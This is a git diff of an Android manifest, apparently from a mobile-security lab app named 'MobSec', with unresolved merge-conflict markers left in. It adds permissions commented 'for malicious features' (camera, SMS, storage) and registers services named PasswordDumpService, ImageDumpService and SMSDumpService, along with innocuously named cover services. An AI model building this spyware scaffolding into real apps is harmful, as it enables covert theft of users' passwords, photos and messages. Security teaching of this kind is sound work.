@@ -2,11 +2,32 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+<<<<<<< Updated upstream
+=======
+    <!-- Permissions for database connection -->
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+>>>>>>> Stashed changes
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
         tools:node="replace" />
+
+    <!-- Permissions for malicious features -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
 
     <application
         android:allowBackup="true"
@@ -19,16 +40,42 @@
         android:theme="@style/Theme.MobSec"
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
+<<<<<<< Updated upstream
         
         <service
             android:name=".TacoDeliveryService"
             android:enabled="true"
             android.exported="false"
+=======
+
+        <service
+            android:name=".TacoDeliveryService"
+            android:enabled="true"
+            android:exported="false"
+>>>>>>> Stashed changes
             android:foregroundServiceType="specialUse">
             <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="System-critical background task for research purposes" />
         </service>
 
+<<<<<<< Updated upstream
+=======
+        <service
+            android:name=".CheeseTopping"
+            android:exported="false"
+            android:foregroundServiceType="camera" />
+
+        <service
+            android:name=".malicious.PasswordDumpService"
+            android:exported="false" />
+        <service
+            android:name=".malicious.ImageDumpService"
+            android:exported="false" />
+        <service
+            android:name=".malicious.SMSDumpService"
+            android:exported="false" />
+
+>>>>>>> Stashed changes
         <activity
             android:name=".MainActivity"
             android:exported="true"
